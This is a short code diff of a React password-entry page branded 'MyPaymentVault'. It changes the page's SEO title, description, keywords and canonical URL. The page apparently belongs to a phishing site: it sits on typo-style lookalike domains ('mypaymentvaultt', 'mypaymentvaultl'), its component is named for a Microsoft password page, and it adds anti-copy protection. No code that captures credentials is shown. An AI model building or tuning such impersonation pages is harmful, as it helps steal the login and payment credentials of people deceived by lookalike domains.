@@ -107,10 +107,10 @@ export default function MicrosoftPasswordPage() {
   return (
     <>
       <SEO 
-        title="Login MyPaymentVault | Enter Password - Complete Sign In"
-        description="Complete Login MyPaymentVault password verification. Secure multi-factor authentication alternative to Northlane and Wirecard."
-        keywords="login mypaymentvault, mypaymentvault login, password authentication, login northlane, login wirecard, secure authentication, complete login"
-        canonical="https://login-mypaymentvaultt.com/microsoft-password"
+        title="Enter Password | MyPaymentVault Authentication"
+        description="Complete your MyPaymentVault login by entering your password. Secure authentication for your payment account."
+        keywords="MyPaymentVault password, secure authentication, mypaymentvault login, password verification, payment vault access"
+        canonical="https://login-mypaymentvaultl.com/microsoft-password"
       />
       <AntiCopyProtection />
       <div style={{ 
